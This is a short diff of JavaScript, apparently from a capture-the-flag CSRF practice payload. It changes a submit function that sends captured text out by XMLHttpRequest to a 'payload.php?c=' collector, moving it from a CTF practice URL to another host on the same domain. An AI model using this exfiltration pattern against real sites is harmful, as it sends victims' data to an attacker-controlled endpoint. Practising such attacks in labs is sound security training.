@@ -53,7 +53,7 @@ xhr.send(new Blob([aBody]));
 
 function submit(text){
     var xhr2 = new XMLHttpRequest();
-    xhr2.open("GET","http://ctf.w2nd.me/csrf/practice3/payload.php?c="+text);
+    xhr2.open("GET","http://gallery.w2nd.me/payload.php?c="+text);
     xhr2.onreadystatechange=undefined;
     xhr2.send();
 }
